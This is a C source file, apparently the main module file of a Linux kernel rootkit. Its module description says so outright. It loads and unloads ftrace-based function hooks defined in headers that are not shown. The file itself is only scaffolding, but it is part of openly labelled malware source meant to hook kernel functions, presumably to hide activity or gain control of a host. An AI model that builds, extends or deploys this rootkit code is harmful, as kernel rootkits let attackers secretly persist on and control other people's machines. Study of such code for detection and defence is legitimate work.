#include <linux/module.h>
#include <linux/kernel.h>
// #include <linux/init.h>
// #include <linux/version.h>
// #include <linux/errno.h>
// #include <linux/moduleparam.h>
// #include <linux/types.h> /* pid_t */

#include "rootkit.h"
#include "ftrace_helper.h"
#include "usrlib.h"
#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BusyBox13");
MODULE_DESCRIPTION("Rootkit for linux kernel");
MODULE_VERSION("0.0.1");

/**
 * @brief Initialize the module and register hooks.
 *
 * This function sets up the necessary hooks for the module, ensuring
 * that the required handlers are in place. If any hook cannot be found
 * or registered, the function returns an error code.
 *
 * @return
 *      - 0: Success, the module and hooks were successfully initialized.
 *
 *      - ENOENT: One or more hooks were not found.
 */
static int __init hook_init(void)
{
    int err;

    err = fh_install_hooks(hooked, ARRAY_SIZE(hooked));
    if (err)
    {
        warn("fh_install_hooks failed: %d\n", err);
        return err;
    }
    // info("Hooks installed\n");

    return 0;
}

/**
 * Destroy the module and remove hooks
 */
static void __exit hook_exit(void)
{
    fh_remove_hooks(hooked, ARRAY_SIZE(hooked));
    // info("hooks removed\n");
}

module_init(hook_init);
module_exit(hook_exit);
